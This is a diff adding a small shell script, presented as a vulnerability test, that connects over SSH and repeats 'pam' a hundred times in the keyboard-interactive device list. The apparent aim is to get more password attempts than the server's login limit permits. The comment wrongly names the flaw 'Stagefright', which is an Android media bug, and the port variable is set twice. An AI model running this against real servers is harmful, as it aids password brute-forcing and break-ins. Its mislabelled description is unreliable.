@@ -1,0 +1,9 @@
+#!/bin/sh
+
+# test for Stagefright Vulnerability: if it doesn't stop after 3 failed logins...
+
+HOST=${1-nohost}
+PORT=22
+PORT=2022
+
+ssh -lrazz -p${PORT} -oKbdInteractiveDevices=`perl -e 'print "pam," x 100'` ${HOST}
